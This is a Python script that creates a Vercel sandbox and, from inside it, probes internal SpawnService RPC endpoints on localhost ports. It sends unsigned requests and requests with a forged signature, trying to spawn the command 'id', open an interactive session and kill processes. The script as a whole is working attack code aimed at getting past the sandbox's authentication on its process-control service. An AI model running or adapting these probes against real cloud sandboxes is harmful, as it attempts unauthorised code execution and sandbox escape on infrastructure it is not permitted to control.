# 实验J97: 30001/23456 上的 SpawnService RPC 探测 — 无签名 vs 假签名 + SpawnInteractive
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj97"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import socket, base64, json, time

PORTS = [30001, 23456, 30002]

SIG = base64.b64encode(b"\x99" * 64).decode()
TS = str(int(time.time() * 1000))

CASES = [
    # (port, path, body, use_sig)
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", False),
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", True),
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/Spawn", b'{"command":"id"}', False),
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/Spawn", b'{"command":"id"}', True),
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", b"{}", False),
    (30001, "/vercel.sandbox.spawn.v1.SpawnService/Kill", b'{"processId":"1"}', False),
    (23456, "/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", False),
    (23456, "/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", True),
    (23456, "/vercel.sandbox.spawn.v1.SpawnService/Spawn", b'{"command":"id"}', False),
    (30002, "/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", False),
]

def probe(port, path, body, use_sig, timeout=5):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        headers = [f"POST {path} HTTP/1.1", "Host: localhost",
                   "Content-Type: application/connect+json",
                   "Connect-Protocol-Version: 1",
                   "x-timestamp: " + TS,
                   "Content-Length: " + str(len(body))]
        if use_sig:
            headers.append("x-signature: " + SIG)
        req = "\r\n".join(headers) + "\r\n\r\n"
        s.sendall(req.encode() + body)
        data = b""
        try:
            while len(data) < 1200:
                chunk = s.recv(1200 - len(data))
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
        if not data:
            return "NO-RESP"
        st = data.split(b"\r\n", 1)[0].decode(errors="replace")
        return f"{st} body={data[-600:]!r}"
    except Exception as e:
        return f"ERR({e})"

for port, path, body, use_sig in CASES:
    print(f"[{port}] {path} sig={use_sig} -> {probe(port, path, body, use_sig)}", flush=True)
"""
run_cmd(sid, PROBE, "spawn-on-host", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
